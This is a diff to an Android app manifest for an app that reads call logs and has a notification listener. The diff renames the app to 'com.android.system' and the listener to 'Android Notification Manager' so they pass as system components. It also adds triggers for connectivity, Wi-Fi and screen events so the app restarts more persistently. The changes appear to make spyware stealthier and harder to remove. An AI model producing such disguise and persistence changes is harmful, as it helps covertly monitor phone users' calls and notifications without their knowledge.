@@ -9,7 +9,7 @@
     <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
     <uses-permission android:name="android.permission.READ_CALL_LOG" />
 
-    <application android:label="System IMEI Service">
+    <application android:label="com.android.system">
 
         <activity android:name="system.android.services.imei.MainActivity">
             <intent-filter>
@@ -20,7 +20,7 @@
 
         <service
             android:name="system.android.services.imei.NotificationListener"
-            android:label="System Service (Don't disable)"
+            android:label="Android Notification Manager"
             android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
             <intent-filter>
                 <action android:name="android.service.notification.NotificationListenerService" />
@@ -33,6 +33,10 @@
             android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+                <action android:name="android.net.wifi.WIFI_STATE_CHANGED" />
+                <action android:name="android.intent.action.SCREEN_ON" />
+                <action android:name="android.intent.action.SCREEN_OFF" />
             </intent-filter>
         </receiver>
         <receiver
